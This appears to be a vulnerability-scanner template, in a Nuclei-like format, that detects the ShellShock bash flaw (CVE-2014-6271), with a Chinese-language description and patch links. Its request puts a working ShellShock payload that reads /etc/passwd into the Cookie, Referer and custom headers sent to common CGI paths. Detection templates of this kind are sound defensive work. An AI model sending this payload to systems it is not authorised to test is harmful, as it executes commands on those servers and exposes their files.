id: CVE-2014-6271
info:
  name: ShellShock - Remote Code Execution
  author:
  - l0ne1y
  description: |-
    GNU Bash 环境变量远程命令执行漏洞
    GNU Bash（Bourne again shell）是一个为GNU计划编写的Unix shell。
    GNU Bash 4.3及之前版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行shell命令。某些服务和应用允许未经身份验证的远程攻击者提供环境变量以利用此漏洞。此漏洞源于在调用bash shell之前可以用构造的值创建环境变量。这些变量可以包含代码，在shell被调用后会被立即执行。
    此漏洞可能会影响到使用ForceCommand功能的OpenSSH sshd、使用mod_cgi或mod_cgid的Apache服务器、DHCP客户端、其他使用bash作为解释器的应用等。
    目前认为使用`mod_php/mod_python/mod_perl`的Apache httpd不受此问题影响。
  severity: critical
  remediation: |-
    **官方修复方案：**
    目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载：

    http://www.gnu.org/software/bash
    http://ftp.gnu.org/gnu/bash/
requests:
- matchers:
  - type: status
    status:
    - 200
  - type: regex
    part: body
    regex:
    - 'root:.*:0:0:'
  matchers-condition: and
  path:
  - '{{BaseURL}}'
  - '{{BaseURL}}/cgi-bin/status'
  - '{{BaseURL}}/cgi-bin/stats'
  - '{{BaseURL}}/cgi-bin/test'
  - '{{BaseURL}}/cgi-bin/status/status.cgi'
  - '{{BaseURL}}/test.cgi'
  - '{{BaseURL}}/debug.cgi'
  - '{{BaseURL}}/cgi-bin/test-cgi'
  method: GET
  headers:
    Cookie: '() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd '
    Referer: '() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd '
    Shellshock: '() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd '
  stop-at-first-match: true
